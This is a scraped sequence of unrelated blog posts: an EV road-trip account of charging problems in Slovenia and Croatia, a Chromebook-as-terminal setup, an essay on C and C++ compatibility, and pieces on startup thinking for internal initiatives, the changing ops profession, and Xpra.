because:</p><p><em>#4: Lock your <a href="https://www.evexpert.eu/p/338/duosida-charging-cable-type2-type2-32a-3phase" target="_blank" rel="noopener noreferrer">230 EUR Type 2 cable</a> if you don’t want it stolen.</em></p><p>Between event sessions, I was Googling “fast EV chargers in Slovenia.” Highway stops by “Petrol” had them, great. Around 11 PM, we left Ljubljana in high spirits. We arrived at the Petrol station and found a fast charger, with cables. Guess what happened next:</p><p><em>#5: EU fast chargers are activated via a proprietary chip card or smartphone app. Each company in each country uses a different card / app.</em></p><p>Of course, I only had a smartphone charging app for Croatia. Lessons were coming fast:</p><p><em>#5A: Petrol gas stations clerks can’t sell you a Petrol charging card, and they can’t activate an EV charging even when you want to pay for it.</em></p><p>“Download and register in the Petrol app,” the night clerk said. Yes, but:</p><p><em>#5B: Petrol Android app is 50 MB, so if a station is covered by a <a href="https://www.gsmarena.com/glossary.php3?term=edge#:~:text=EDGE%20(also%20known%20as%20Enhanced,order%20to%20conserve%20spectrum%20resources." target="_blank" rel="noopener noreferrer">slow EDGE signal</a>, you can’t download the app.</em></p><p>We got back to the highway, where my friend caught H+ signal and downloaded the app. At the next Petrol station, we discovered:</p><p><em>#5C: When you hit the “Start charging” button in the Petrol app, it redirects you to a registration form to enter payment and address.</em></p><p>No problem, I can fill the form, even on EDGE signal. But then:</p><p><em>#5D: To register in the Petrol app, needed for charging, you need a valid address in Slovenia.</em></p><p>It is good the EV charging station was 20 meters away from the gas station because I was cursing Petrol so loud a clerk would have had all rights to call the police. I should have read <a href="https://play.google.com/store/apps/details?id=si.petrol.onecharge&amp;hl=en" target="_blank" rel="noopener noreferrer">Petrol app comments</a> beforehand:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1.png"><img title="Petrol app comments" src="https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1-1024x732.png" alt="" width="584" height="417" srcset="https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1-1024x732.png 1024w, https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1-300x214.png 300w, https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1-768x549.png 768w, https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1-420x300.png 420w, https://svedic.org/wp-content/uploads/2020/08/OneCharge-app-Petrol-comments-1.png 1105w" sizes="(max-width: 584px) 100vw, 584px"></a>It was past midnight when we got back on the highway. To extend the range, I slowed down to 75 km/h (46 mph). The limit was 130km/h, so a trailer truck started taking over us. Then I remembered a Tour de France strategy I saw on TV:</p><p><em>#6: In an emergency, you can extend the range of your EV by tailgating a&nbsp; trailer truck, a strategy called <a href="https://en.wikipedia.org/wiki/Drafting_(aerodynamics)" target="_blank" rel="noopener noreferrer">aerodynamic drafting</a>.</em></p><p>Don’t hold me responsible for traffic tickets or beating by an angry trucker. There I was, hidden behind a trailer truck, to save electricity while driving 90 km/h. The car showed it was using less power, and the range extended. When we entered Zagreb, there was 19 km left:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/Zagreb-low-battery-small.jpg"><img title="Kona EV low battery warning, Credits: Zeljko Svedic" src="https://svedic.org/wp-content/uploads/2020/08/Zagreb-low-battery-small-300x233.jpg" alt="" width="300" height="233" srcset="https://svedic.org/wp-content/uploads/2020/08/Zagreb-low-battery-small-300x233.jpg 300w, https://svedic.org/wp-content/uploads/2020/08/Zagreb-low-battery-small-387x300.jpg 387w, https://svedic.org/wp-content/uploads/2020/08/Zagreb-low-battery-small.jpg 630w" sizes="(max-width: 300px) 100vw, 300px"></a></p><p>I went to a fast-charging station I could actually activate, and I fell asleep in the car.</p><p>I made fun of Petrol for their unfriendliness towards tourists, but at least the EV chargers at Petrol stations are working. In Croatia, you can’t always count on that. In my modest opinion, that stems from the fact that charging is free. Why is free electricity a problem, you ask? There is no commercial incentive to build and maintain charging stations. Instead, most chargers are built when the EU donates money or when the government is pressed to improve EV infrastructure. Local politicians come when a charging station is finished to deliver speeches: “This is an example of Croatia using EU funds wisely, for a green and sustainable future.” After the journalists leave, there is no economic interest in sustaining chargers in the future.</p><p>For example, this city-provided Type 2 charger has been broken for three months:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/Garage-broken-charger-2-small.jpg"><img title="Broken charger 1, Credits: Zeljko Svedic" src="https://svedic.org/wp-content/uploads/2020/08/Garage-broken-charger-2-small.jpg" alt="" width="641" height="873" srcset="https://svedic.org/wp-content/uploads/2020/08/Garage-broken-charger-2-small.jpg 641w, https://svedic.org/wp-content/uploads/2020/08/Garage-broken-charger-2-small-220x300.jpg 220w" sizes="(max-width: 641px) 100vw, 641px"></a></p><p>In front of the Zagreb city hall, one charging station displays an error:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/City-charger-error-1.jpg"><img title="Broken charger 2, Credits: Zeljko Svedic" src="https://svedic.org/wp-content/uploads/2020/08/City-charger-error-1.jpg" alt="" width="704" height="455" srcset="https://svedic.org/wp-content/uploads/2020/08/City-charger-error-1.jpg 704w, https://svedic.org/wp-content/uploads/2020/08/City-charger-error-1-300x194.jpg 300w, https://svedic.org/wp-content/uploads/2020/08/City-charger-error-1-464x300.jpg 464w" sizes="(max-width: 704px) 100vw, 704px"></a></p><p>While other just states it is out of order:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/City-charger-error-2.jpg"><img title="Broken charger 3, Credits: Zeljko Svedic" src="https://svedic.org/wp-content/uploads/2020/08/City-charger-error-2.jpg" alt="" width="535" height="145" srcset="https://svedic.org/wp-content/uploads/2020/08/City-charger-error-2.jpg 535w, https://svedic.org/wp-content/uploads/2020/08/City-charger-error-2-300x81.jpg 300w, https://svedic.org/wp-content/uploads/2020/08/City-charger-error-2-500x136.jpg 500w" sizes="(max-width: 535px) 100vw, 535px"></a></p><p>What I learned is:</p><p><em>#7: Free chargers are often unmaintained, and you are better with a commercial provider you can hold accountable.</em></p><p>“But, there is nothing to break on a charging station!” I thought. Boy, I was wrong. EV charging stations use internal computer for authorization, and for controlling the display and the charging protocol. Before charging starts, a car locks the cable with the mechanical pin and signals that back to the charger. When a car is unlocked, it signals a charger to drop the voltage to zero, so the mechanical pin holding cable can be released. Guess what?</p><p><em>#8: Some chargers are not compatible with some EVs and refuse to stop charging, resulting in the “Hotel California effect.” You can check out in the app, but you can never leave.</em></p><p>For example, Croatian Telecom chargers. The first time their cable got stuck in my car I panicked. Their app was not working, the charger was not responding to car signals, and their charging stations don’t have the stop button:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/HT-charger-cable-locked.jpg"><img title="HT charger cable locked, Credits: Zeljko Svedic" src="https://svedic.org/wp-content/uploads/2020/08/HT-charger-cable-locked.jpg" alt="" width="899" height="585" srcset="https://svedic.org/wp-content/uploads/2020/08/HT-charger-cable-locked.jpg 899w, https://svedic.org/wp-content/uploads/2020/08/HT-charger-cable-locked-300x195.jpg 300w, https://svedic.org/wp-content/uploads/2020/08/HT-charger-cable-locked-768x500.jpg 768w, https://svedic.org/wp-content/uploads/2020/08/HT-charger-cable-locked-461x300.jpg 461w" sizes="(max-width: 899px) 100vw, 899px"></a></p><p>They have the contact phone, but it was Sunday afternoon. I called them, expecting three levels of menus and “we are not working on weekends” message. To my great surprise, a female voice answered after two rings. “I have a big problem with your EV charging station: I can’t get my car out because…” My explanation was stopped by “What is the serial number written on the station?” As I dictated the serial, I could hear fast typing. A few seconds later charging station stopped buzzing, display went blank for a moment, and I could unplug my car. “Wow, that was fast, thank you very much!” I said. Although they currently don’t charge for electricity, Croatian Telekom is a commercial operation. They have a direct 24/7 support line where a representative can reset any charging station in Croatia, provided the serial number. It seems that such a solution was easier than fixing charging stations or the charging app. I now just call them and say, “Can you reset the station with serial X?” If you work there, let me know, I would like to buy a box of chocolates for the team.</p><p>Unfortunately, EV charges are not the only thing broken here. Our driving culture is also broken:</p><p><em>#9: It is common to find a gas car parked at the EV charging spot, the practice called <a href="https://twitter.com/ivebeeniced?lang=en" target="_blank" rel="noopener noreferrer">ICEing</a> (internal combustion engine-ing).</em></p><p>One time I urgently needed to charge, and this was the charging spot:</p><p><a href="https://svedic.org/wp-content/uploads/2020/08/EV-parking.jpg"><img title="Blocking EV parking, Credits: Zeljko Svedic" src="https://svedic.org/wp-content/uploads/2020/08/EV-parking.jpg" alt="" width="717" height="785" srcset="https://svedic.org/wp-content/uploads/2020/08/EV-parking.jpg 717w, https://svedic.org/wp-content/uploads/2020/08/EV-parking-274x300.jpg 274w" sizes="(max-width: 717px) 100vw, 717px"></a></p><p>ICEing is common around the world.

    <h3>Fully embracing the dumb terminal laptop</h3>
    <p>August 29, 2020</p>
    <img src="https://zainamro.com/assets/img/chromebook.png">
    <p>A few days ago, I picked up a <a href="https://www.google.com/chromebook/device/samsung-chromebook-4/">$229 Chromebook</a> with minimum specs and have decided to replace all my existing Macbook Pros and Airs and use it as my main machine for development work (and everything else). This isn’t because it’s a great laptop; in fact, it’s a far-below-average laptop when you consider the current hardware options on the market. But, that’s precisely why I picked it — it leaves nothing more to be desired, because I redefined what I expect out of a laptop and instead optimized on price and having the minimum feature set to connect to a remote machine. It might sound a bit defeatist, but once you treat your client machine as a dumb terminal and nothing more, you actually end up with a more robust and reliable setup.</p>
    <p>After being constantly disappointed with common Macbook quality issues (keyboard problems, display gasket peeling off, etc.) and looking at the available options on the market, I realized my seemingly basic desire to have an easy to use, robust laptop that has software and hardware that just works is becoming more of a pipe dream. So, I did something that seems like a regression — buy a low-end, dumb laptop that I just use to ssh into a remote linux server where I do all my work. I chose a Chromebook because it’s portable, has good battery life, and has an operating system that is decent for non-dev work. When in terminal, I use <a href="https://www.gnu.org/software/screen/">Screen</a> and <a href="https://www.gnu.org/software/emacs/">Emacs</a> to work and save my sessions for later. And, I use <a href="https://tailscale.com/">Tailscale</a> which allows me to magically create a private mesh network between my machines in a couple minutes; this is what makes it easy to access remote services on my server like a locally-hosted web server for instance. When I'm working outside without access to wifi, I simply connect to my phone's hotspot which provides me enough speed to work on my remote server. This no-frills setup is simple but works well enough.</p>
    <img src="https://zainamro.com/assets/img/chromebook_screenshot.png">
    <p>With a distributed setup, the client machine is just the control device to a much larger system. I couldn’t care less how fancy or powerful my laptop is as long as it has a display, keyboard, and internet that works. And if this laptop is stolen or breaks, I wouldn't be affected. I would just buy another cheap laptop and pick up where I left off. This was perhaps the wisdom behind the vision for the <a href="https://en.wikipedia.org/wiki/Plan_9_from_Bell_Labs">Plan 9</a> distributed operating system which took this core idea to a whole new level during the 80’s beyond dumb terminals.</p>
    <p>This setup may obviously not work for everyone since terminal/ssh is limited when it comes to non-textual work or work requiring more visual interfaces. Of course, you could setup X11 forwarding or some other remote GUI software, but I've always found the latency too unbearable to work with. I think in 2020, it might be worthwhile to take a step back and ask ourselves whether this should still be the case. When you think of all the amazing things you can do with distributed computing and what Plan 9 managed to do over 30 years ago, it makes one wonder why we’re still stuck with basic tools like terminal/ssh; with the right abstractions and local caching, we could provide a more integrated relationship between software, network computing, and the visual representation of that on the client machine. Additionally, the rise of 5G brings us even closer to "always online" laptops with fast internet, opening the door to more interesting architectures centered around network computing. I’d imagine a true modern successor to Plan 9 (I don't mean ChromeOS) would be a delightful experience where laptops instead focus on providing beautiful, well-functioning interfaces to remote computing systems with theoretically infinite computing power, memory, and storage. Assuming the network and security/privacy challenges can be figured out, this seems to me like it would be a far superior approach to how we use computers today.</p>

<![CDATA[The Problem with C]]>

September 1, 2020 | https://cor3ntin.github.io/posts/c/ | <a href="https://web.archive.org/web/*/https://cor3ntin.github.io/posts/c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p><img src="https://cor3ntin.github.io/posts/c/fight.jpeg" alt="Fish"></p>
<p>In the early 70s, C was created at Bell Labs as a byproduct of the development of UNIX.
It quickly became one of the most popular programming languages.
But it was not expressive enough for Bjarne Stroustrup.
And so, in 1983, as a byproduct of his Ph.D. thesis, he extended C.</p>
<p>C with classes was born.</p>
<p>At the time, Bjarne Stroustrup understood that a programming language has many components,
not only the language, its compiler, but also a linker and libraries.
Offering a familiar tool also makes adoption easier.
In this historical context, it makes sense that C++ would be based on C.</p>
<p>Fast-forward 40 years later.</p>
<p>Both C and C++ are widely used in the industry.
But go 5 minutes on the Internet and C developers will tell you that C++ is the most horrific man-made creation,
while many C++ developers wait for the day when C finally burns in the hot flames of hell.</p>
<h2 id="so-what-happened">So what happened?</h2>
<p>On the surface, C and C++ cater to the same use cases: high performance, deterministic, native but portable code for the widest range of hardware and applications.</p>
<p>But C is proudly a low-level language. A nicer assembly.</p>
<p>From day one, C++ had magic. Dark witchcraft: destructors. Suddenly the compiler was doing things on its own.
It also had type inference very early on, but the developers of the mid-80s were not quite ready for that and Bjarne Stroustrup
was pressured into removing <code>auto</code>, until it was added back to C++11.</p>
<p>From then, C++ got more and more tools to build abstractions.
I don’t think it would be fair to say that C++ is a low-level or high-level language. It’s both, by design.
But building high-level abstractions while not sacrificing performance is hard.
C++ then needed tools to achieve that: <code>constexpr</code>, move semantics, templates, and an ever-growing standard library.</p>
<p>Fundamentally I think C trusts developers while C++ trusts compilers.
This is a massive difference that sharing the same native types or syntax for while loop cannot hide.</p>
<p>C++ developers blame C for all their lost limbs, while C developers probably think C++ is batshit crazy.
I imagine that is a fair perspective if you look at C++ through a C lense. C++ is pretty wild <em>as a superset of C</em>.
A seasoned C person looking at C++ expecting familiarity in C++ will not find it. C++ is not C.
This is enough to feed flamewars for generations.</p>
<p>But as much as I dislike C, I don’t have any legitimacy to make fun of it. See, I have some experience with C++ but I
wrote very little C. It was probably bad C.
A language is also its good practices, patterns, idioms, and these take years to learn. If you try to write C code like it’s C++ or C++ like it is C, you will have a bad time.
Knowing <a href="https://www.youtube.com/watch?v=YnWhqhNdYyk">C doesn’t teach you C++</a>. Knowing C++ does not teach you C.</p>
<p>So can we all stop saying C/C++, regret the unfortunate naming, and sing kumbaya in harmony?
Not so fast.</p>
<p>See, despite being philosophically different from C, C++ is still somewhat a superset of C.
That is to say, you can include a C header in a C++ translation unit and that should compile.
And this is where it gets messy.</p>
<p>C++ is not an extension of C.
It is designed as a separate standard, by a different committee, different people.
Logically, people who like C++'s philosophy will get involved in the C++ community and the C++ standardization process
while other people might try to get involved with C.
Committees, whether its C’s or C++'s, only manifest intent and direction through their respective end-product: the standards; standards which are the fruits of numerous voting.</p>
<p>At the same time, it is difficult for a compiler to know that it is dealing with a C header or a C++ header.</p>
<p><code>extern "C"</code> is not used consistently and only affects mangling, but neither grammar nor semantics.
And headers only exists in the eyes of the preprocessor, for a C++ compiler, everything is a C++ translation unit, and therefore C++.
And yet, people include C headers in C++ and expect it to “just work” ™️.
Which it mostly does.</p>
<p>We can wonder then,</p>
<h2 id="how-c-maintains-c-compatibility-while-being-developed-by-different-people-in-different-places">How C++ maintains C compatibility while being developed by different people in different places?</h2>
<p>Badly, I’m afraid.</p>
<p>A coworker recently reminded me of Conway’s law:</p>
<blockquote>
<p>Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization’s communication structure</p>
</blockquote>
<p>By that logic, it would stand to reason that if the two committees don’t interoperate,
neither would the languages they produce.</p>
<p>C++ maintains a list of <a href="http://eel.is/c++draft/diff.iso">incompatibilities with C</a> and <a href="http://eel.is/c++draft/diff.library">its standard library</a>.
This list does not seem to reflect the many features that were added to C11 and C18 but are not valid C++ constructs. <a href="https://en.wikipedia.org/wiki/Compatibility_of_C_and_C%2B%2B">Wikipedia</a> draws a clearer picture.</p>
<p>Listing incompatibilities isn’t sufficient to get a measure of incompatibilities between both languages.</p>
<p>Functions that exist in the C++ standard library but whose primary declaration is expected to come from C are difficult to make <code>constexpr</code>, and more difficult still to make <code>noexcept</code>.
C compatibility translates to performance costs and C functions are optimization barriers.</p>
<p>Many C constructs are valid C++ but should never pass a code review (<code>NULL</code>, <code>longjmp</code>, <code>malloc</code>, create/destroy functions, <code>free</code>, C  casts), etc.</p>
<p>These might not be bad C idioms, but they are bad C++. C++ has a stronger type system,
and unfortunately using C idioms punch a giant hole in that type system, and so C compatibility has a cost in terms of safety.</p>
<p>Don’t get me wrong, C++ still care about C compatibility. Somewhat.
And interestingly C cares about C++. Somewhat.
Truth be told, C might care about C++ more than C++ cares about C.
So each committee cares somewhat about what the other does.
We care reluctantly.</p>
<p>See, C++ is aware of the many foundational libraries written in C, not only the <code>libc</code> but also <code>zip</code>, <code>png</code>, <code>curl</code>, <code>openssl</code> (!), and countless others, which are used in many, many C++ projects.
We can’t break that.</p>
<p>But recently, especially over the past decade, C++ has become much bigger than C.
C++ has more users - and a much more active community: <a href="https://nullprogram.com/blog/2018/11/21/">There Are No C Conferences</a>.
Maybe that’s why the C++ committee is now over 10 times the size of the C committee.</p>
<p>C++ then is a force to be reckoned with and the C committee has to consider not breaking C++.
To the point that if a standard would track another, these days, C++ leads and C follow.</p>
<p>C++ is now on a steady three years cycle come rain or shine, or deadly pandemics.
Meanwhile, C has a major release every decade or so.
This makes sense. As a lower-level language, C doesn’t need to evolve as fast.</p>
<p>The C landscape is also rather different from the C++ landscape.
C caters to more platforms and a lot more compilers.
Everybody and their dog is writing C compilers because the language has a surface area small enough to make that possible, whereas the C++ committee will only really consider 4 implementations, all of which are represented at every meeting.
As a result, many features in C are implementation-defined or optionally supported so that the variety of compilers that exist can claim conformance without doing much work, which I’m told pleases regulatory bodies.</p>
<p>C++ these days is more interested in portability than implementation freedom. Yet another difference of philosophy.</p>
<h2 id="so-your-proposal-breaks-c-compatibility">So, your proposal breaks C compatibility</h2>
<p>Parts of my <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2020/p2178r1.pdf">P2178</a> paper theoretically affects C compatibility.
In such cases, none of the options seems satisfactory.</p>
<p>You could be told that you have to first get your feature into C. Which means more meetings.
Meetings you might not be able to attend because C has strict <a href="https://thephd.github.io/follow-the-river-wg14-ithaca-2019">attendance rules</a> - Excluding individuals not willing to put down thousands of dollars to become ISO members.
This is because the C committee is forced to adhere strictly to ISO rules.</p>
<p>It might also take a decade if the standard just shipped.
And most importantly, it might go nowhere if the C committee doesn’t understand or doesn’t care about the particular problem you are trying to solve.
And they probably don’t have the bandwidth to deal with it.
And you may not have the bandwidth to deal with C. After all, you joined C++ to improve C++.
In fact, if the room invites you to “talk to the C committee”, it is likely your proposal is dead, even in the unlikely event that no one in the room was against it.</p>
<p>Another likely scenario is that the C committee accepts a version of a proposal that is slightly different from what exists in C++.
<code>true</code>? Let’s make that a macro. <code>char16_t</code> ? Let’s make that a typedef. <code>char32_t</code>? Not necessarily UTF-32. <code>static_assert</code> ? <code>_Static_assert</code>.</p>
<p>The list goes on. Should we blame C? Probably not. Their committee does what they think is best for their language.
The opposite is true too. In C++20 designated initializers were inspired by C’s but are slightly different because they would otherwise not fit with the C++ initialization rules.</p>
<p>I am part of the problem. C has VLAs. I would vote against a proposal to adopt that in standard C++, <a href="https://www.phoronix.com/scan.php?page=news_item&amp;px=Linux-Kills-The-VLA">too many security issues</a>. A proposal to add <code>_Generic</code> to C++ would be over-my-dead-body. I am not sure if <code>_Generic</code> attempts to palliate to the lack of template or the lack of overloads, but C++ has both these features - from my point of view <code>_Generic</code> doesn’t fit into the big picture of what I imagine C++ to be.</p>
<p>Both committees seem also inconsistent in how much they care about the other language.
Sometimes we go to great lenghts (<a href="https://en.cppreference.com/w/cpp/numeric/complex">std::complex</a>), sometimes we don’t care at all (<a href="https://en.cppreference.com/w/c/language/array">static array parameters</a>).</p>
<p>There is no way around this. Don’t forget that each committee is a bunch of people
voting at different times in different rooms and trying to control the outcome would defeat the purpose
of having a vote.
Putting people in the same room is not realistic either. ISO might object and the participation inbalance
would put C people at an enormous disadvantage.</p>
<h2 id="c-compatibility-doesnt-matter-kinda">C compatibility doesn’t matter, kinda</h2>
<p>If you are a C developer, I imagine you see C as a neat programming language.
But for the rest of us, C is something else.</p>
<p>C is the universal, cross-language glue that ties it all together.</p>
<p>For C++ users, C is …</p></div></div>

<p>Think of whatever internal initiative your company is pushing right now. Is it an agile transformation? Are you trying to grow your devops competency? Maybe you’re getting into the CDP space? Whatever it is, you probably have a small team of internal people owning it. </p>



<p>Pretend for a second that it’s not internal; instead, let’s say you hired a startup to lead it. Would you still be paying that startup? How would your employees rate it? Is it delivering the results you wanted? Would you have even hired that particular startup in the first place?</p>



<p>The great thing about startups is that they either find a product/market fit, or they die. That process is everything. It usually involves lots of experimentation, observing problems, asking questions, talking about Jobs To Be Done, all kinds of stuff. There are thousands of books written about it.</p>



<p>Internal initiatives tend to skip all of that. A few executives get together and decide that the company needs to do X, and a team is put together for it. Nobody is interviewed, no problems are observed, no questions are asked, and what’s a JTBD again? </p>



<p>“But we did do all that stuff!” Sure you did, for the market of potential clients, but that’s not your market in this case. <em>The market is your internal employees</em>. The startup needs to provide a service to your internal employees, so that they can in turn start providing a service to the potential clients. Did you interview your internal employees? Did you observe their problems? Did you talk about their Jobs To Be Done?</p>



<p>Probably not, so you end up with initiatives that are building a product before a market fit is determined. Is there any chance a startup would ever succeed with that origin story? How many initiatives have you seen die on the vine – most of them? Could it be that adoption never really happened naturally, because the product being offered solved all the wrong problems?</p>



<p>Startup thinking could solve that. Take a note from The Lean Startup and run cheap, easy experiments to get to the root of the problems that actually need solving. Or read The Mom Test and start asking people about their problems without ever talking about your solutions.</p>



<p>Treat your internal employees like the market that they are. Find the product/market fit for them, and build the startup they would love to hire. </p>

			<p><span>Infrastructure, ops, devops, systems engineering, sysadmin, infraops, SRE, platform engineering. As long as I’ve been doing computers, these terms have been effectively synonymous. If I wanted to tell someone what my job was, I could throw out any one of them and expect to be understood.</span></p>
<p><span>Every tech company had a software engineering team that built software and an operations team that built infrastructure for running that software. At some point in the past decade they would have renamed this operations team to “devops” or “SRE”, but whatever the name, that was my team and those were my people.</span></p>
<p><span>But unless you’re an infrastructure company, infrastructure is not your mission. Which means that every second you devote to infrastructure work — and every engineer you devote to infrastructure problems — is a distraction from your core goals.&nbsp;</span></p>
<p><span>What’s more, it’s a distraction that builds on itself. The more time and energy you spend on infrastructure, the more your focus gets scattered, and the more you deprive yourself of the time and energy that ought to be devoted to the problems your business exists to solve.</span></p>
<p><span>This isn’t exactly new. Infrastructure and operations have always been a distraction from your core business problems. It used to be the case that every company had to grow internal expertise in hardware, datacenters, networking, operating systems, config management, and so on up the tech stack until reaching their core business problems. Infrastructure and ops have always been a distraction, but until recently, a necessary one. A means to an end.</span></p>
<p><span>So what’s changed? These days, you increasingly have a choice. Sure, you </span><i><span>can</span></i><span> build all that internal expertise, but every day more and more of it is being served up via API on a silver platter.</span></p>
<p><span>Does this mean that operations is no longer important, no longer necessary? Far from it. Operations and operability are more important than ever. Let’s take a look at what’s happening to the ops profession at a high level, the emerging challenges we face, and the impact this’ll all have on our careers.&nbsp;</span></p>
<h3><b>Changes afoot</b></h3>
<p><span>Beyond the broader move into to cloud services, here are some of the major shifts on our horizon.</span></p>
<h5><b>From monolith to microservices</b></h5>
<p><span>Much has been written about the operational demands of a microservices architecture. Now that functions calling other functions involves a network hop, operational concerns are an unavoidable part of debugging even the most trivial problems. Microservices change the game from “building code” to “building systems”, which pushes more and more code writing into the realm of operations.</span></p>
<h5><b>From monitoring to observability</b></h5>
<p><span>Metric-based tools like Prometheus and DataDog are infrastructure monitoring tools, and quite good ones at that. When you’re responsible for infrastructure, the questions you care about are of aggregates and trends, thresholds and capacity. Monitoring tools are the right tool for the job, because that’s how you understand whether your infrastructure is healthy, and what actions to take to make it or keep it healthy.</span><span><br>
</span><span><br>
</span><span>Observability tools*, on the other hand, are for the people writing and shipping code to users every day, and trying to inspect and understand behavior at the nexus of users, production, and code. Observability tools preserve the full context of the request. This allows you to slice and dice and tease out new correlations, as well as view events in a waterfall by time (“tracing”). Observability is how you connect the dots between software and real business impact, and between your engineers’ experience and your users’ experience. </span><span><br>
</span><span><br>
</span><i><span>*Caution: many monitoring tools are trying to rebrand themselves as observability tools without first building the necessary functionality. To tell the difference, </span></i><a href="https://www.honeycomb.io/blog/so-you-want-to-build-an-observability-tool/"><i><span>see here</span></i></a><i><span>.</span></i></p>
<h5><b>From magic autoinstrumentation to instrumenting with intent</b></h5>
<p><span>Instrumentation is just another form of commenting and documenting your code. There are tools that promise to do it automatically for you, but they aren’t great at capturing intent.. Auto-instrumentation can tell you loads of ancillary details, but they will </span><i><span>never</span></i><span> let you divine the business value intended by the engineer who built it. So suck it up and instrument your code.</span></p>
<h3><b>Ops is dead. Long live ops.</b></h3>
<p><span>Ops teams are going the way of the dodo bird, yet operability, resiliency, and reliability have never been more important. The role of operations engineers is changing fast, and the role is bifurcating along the question of infrastructure. In the future, people who would formerly have called themselves “operations engineers” (or devops engineers) will get to choose between a role that emphasizes </span><i><span>building infrastructure software as a service </span></i><span>and a role that uses their infrastructure expertise to help teams of engineers ship software more effectively and efficiently…generally by building as little infrastructure as possible.</span></p>
<p><span>If your heart truly beats for working on infrastructure problems, you’re in luck! — there are more of those than ever. Go join an infrastructure company. Try one of the many companies — AWS, Azure, all the many developer tooling companies — whose mission consists of building infrastructure software, of being the best in the world at infrastructure, and selling that expertise to other companies. There are roles for software engineers who enjoy building infrastructure solutions as a service, and there are even specialist ops roles for running and operating that infrastructure at scale, or administering those data services at scale.&nbsp;</span></p>
<p><span>Otherwise, embrace the fact that your job consists of </span><i><span>building systems to enable teams of engineers to ship software that creates core business value</span></i><span>, which means home brewing as little infrastructure as possible. And what’s left?</span></p>
<h5><b>Vendor engineering</b><span>&nbsp;</span></h5>
<p><span>Effectively outsourcing components of your infrastructure and weaving them together into a seamless whole involves a great deal of architectural skill and domain expertise. This skill set is both rare and incredibly undervalued, especially considering how pervasive the need for it is. Think about it. If you work at a large company, dealing with other internal teams should feel like dealing with vendors. And if you work at a small company, dealing with other vendors should feel like dealing with other teams.&nbsp;</span></p>
<p><span>Anyone who wants a long and vibrant career in SRE leadership would do well to invest some energy into areas like these:</span></p>
<ul>
<li><span>Learn to evaluate vendors and their products effectively. Ask piercing, probing questions to gauge compatibility and fit. Determine which areas of friction you can live with and which are dealbreakers.</span></li>
<li><span>Learn to calculate and quantify the cost of your and your team’s time and labor. Be ruthless about shedding as much labor as possible in order to focus on your core business.&nbsp;</span></li>
<li><span>Learn to manage the true cost of ownership, and to advocate and educate internally for the right solution, particularly by managing up to execs and finance folks.</span></li>
</ul>
<h5><b>Product engineering</b><span>&nbsp;</span></h5>
<p><span>One of the great tragedies of infrastructure is how thoroughly most of us managed to evade the past 20+ years of lessons in managing products and learning how to work with designers. It’s no wonder most infrastructure tools require endless laborious trainings and certifications. They simply weren’t built like modern products for humans.</span></p>
<ul>
<li><span>I recommend a crash course. Embed yourself within a B2B or B2C feature delivery team for a spell. Learn their rhythms, learn their language, soak up some of their instincts. You’ll need them to balance and blend your instincts for architectural correctness, scaling patterns, and firefighting.</span></li>
<li><span>You don’t have to become an expert in shipping features. But you should learn the elements of relationship-building the way a good product manager does. And you must learn enough about the product lifecycle that you can help debug and divert teams whose roadmaps are hopelessly intertwined and whose roadmaps are grinding to a halt.</span></li>
</ul>
<h5><b>Sociotechnical systems engineering</b><span>&nbsp;</span></h5>
<p><span>The irreducible core of the SRE/devops skill set increasingly revolves around crafting and curating efficient, effective sociotechnical feedback loops that enable and empower engineers to ship code — to move swiftly, with confidence. Your job is not to say “no” or throw up roadblocks, it’s to figure out how to help them get to yes.</span></p>
<ul>
<li><span>Start with embracing releases. Lean hard into the deploy pipeline. The safest diff is the smallest diff, and you should ship automatically and compulsively. Optimize tests, CI/CD, etc so that deploys happen automatically upon merge to main, so that a single mergeset gets deployed at a time, there are no human gates, and everything goes live automatically within a few minutes of a developer committing their code. This is your holy grail, and most teams are nowhere near there.</span></li>
<li><span>Design and optimize on-call rotations that load balance the effort fairly and sustainably, and won’t burn people out. Apply the appropriate amount of pressure on management to devote enough time to reliability and fixing things versus just shipping new features. Hook up the feedback loops so that the people who are getting alerted are the ones empowered and motivated to fix the problems that are paging them. Ideally, you should page the person who made the change, every time.</span></li>
<li><span>Foster a culture of ownership and accountability while promulgating blamelessness throughout the org. Welcome engineers into production, and help them navigate production waters happily and successfully.</span></li>
</ul>
<h5><b>Managing the portfolio of technical investments.</b></h5>
<ul>
<li><span>Operability is the longest term investment / primary source of technical debt, so no one is better positioned to help evaluate and amortize those risks than ops engineers. It is effectively free to write code, compared to the gargantuan resources it takes to run that code and tend to it over the years.</span></li>
<li><span>Get excellent at migrations. Leave no trailing, stale remnants of systems behind to support — those are a terrible drain on the team. Surface this energy drain to decision-makers instead of …</span></li></ul></div></div></div>

<p>“Xpra is a tool which allows you to run X programs — usually on a remote host — and then direct their display to your local machine, disconnect from these programs, and reconnect from<br>
the same or another machine, all without losing any state. It differs from standard X forwarding in that it allows disconnection and reconnection without disrupting the forwarded<br>
application; it differs from VNC and similar remote display technologies in that xpra is rootless: i.e., applications forwarded by xpra appear on your desktop as normal windows managed<br>
by your window manager, rather than being all “trapped in a box together”. Xpra also uses a custom protocol that is self-tuning and relatively latency-insensitive, and thus is usable<br>
over network connections that are too slow or unreliable for standard X forwarding. Xpra can also be used to shadow an existing X11 display.”</p>

  <div>
